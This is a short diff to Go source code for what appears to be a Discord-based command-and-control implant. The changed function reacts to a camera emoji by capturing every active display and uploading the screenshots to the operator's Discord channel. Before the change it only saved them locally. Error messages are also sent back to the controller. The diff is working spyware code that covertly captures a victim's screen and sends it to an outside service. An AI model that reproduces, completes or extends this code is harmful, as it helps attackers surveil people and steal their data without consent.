@@ -91,20 +91,34 @@ func commandAndControl(session *discordgo.Session, message *discordgo.MessageCre
 		flag = 1
 	} else if message.Content == "📸" {
 		n := screenshot.NumActiveDisplays()
-
+		if n == 0 {
+			session.ChannelMessageSendReply(message.ChannelID, "No active Displays", message.Reference())
+		}
 		for i := 0; i < n; i++ {
 			bounds := screenshot.GetDisplayBounds(i)
 
 			img, err := screenshot.CaptureRect(bounds)
 			if err != nil {
-				panic(err)
+				session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
+				goto end
 			}
-			fileName := fmt.Sprintf("%d_%dx%d.png", i, bounds.Dx(), bounds.Dy())
-			file, _ := os.Create(fileName)
-			defer file.Close()
-			png.Encode(file, img)
-
-			fmt.Printf("#%d : %v \"%s\"\n", i, bounds, fileName)
+			var buf bytes.Buffer
+			err = png.Encode(&buf, img)
+			if err != nil {
+				session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
+				goto end
+			}
+			discordFile := &discordgo.File{
+				Name:   "Screenshot.png",
+				Reader: bytes.NewReader(buf.Bytes()),
+			}
+			_, err = session.ChannelMessageSendComplex(message.ChannelID, &discordgo.MessageSend{
+				Files: []*discordgo.File{discordFile},
+			})
+			if err != nil {
+				session.ChannelMessageSendReply(message.ChannelID, err.Error(), message.Reference())
+				goto end
+			}
 		}
 		flag = 1
 	} else if strings.HasPrefix(message.Content, "👇") {
